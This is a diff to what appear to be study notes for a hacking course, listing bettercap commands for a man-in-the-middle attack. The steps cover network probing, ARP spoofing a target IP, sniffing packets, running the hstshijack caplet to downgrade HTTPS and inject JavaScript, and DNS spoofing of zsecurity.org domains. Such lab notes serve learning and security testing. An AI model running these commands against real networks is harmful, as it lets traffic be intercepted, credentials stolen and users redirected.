@@ -4,10 +4,10 @@ bettercap -iface eth0 -caplet [.cap]
 # show description of module net.probe
 help net.probe
 
-# turn on module net.probe
+# turn on module net.probe, automatically start net.recon
 net.probe on
 
-# show all potential targets
+# show all potential targets, all clients
 net.show
 
 # show all build in caplets
@@ -23,15 +23,29 @@ net probe on
 set arp.spoof.fullduplex true
 set arp.spoof.targets [target ip]
 arp.spoof on
+###
+
+
+# sniff packets, can see http
+# sniff even if packets run from own machine
 set net.sniff.local true
 net.sniff on
 
 
 
 # type the name of caplet inside bettercap to run it
-hstshijack
+# hstshijack can downgrade https and partially pass hsts
+hstshijack/hstshijack
 
 # hstshijack.cap script inject js code inside hstshijack.cap script
 set hstshijack.payload [...],*:[.js]
 
+
+
+
 # dns.spoof wait for 1 min to load and refresh
+# spoof all dns request
+set dns.spoof.all true 
+
+# domains to be spoofed
+set dns.spoof.domains zsecurity.org, *.zsecurity.org
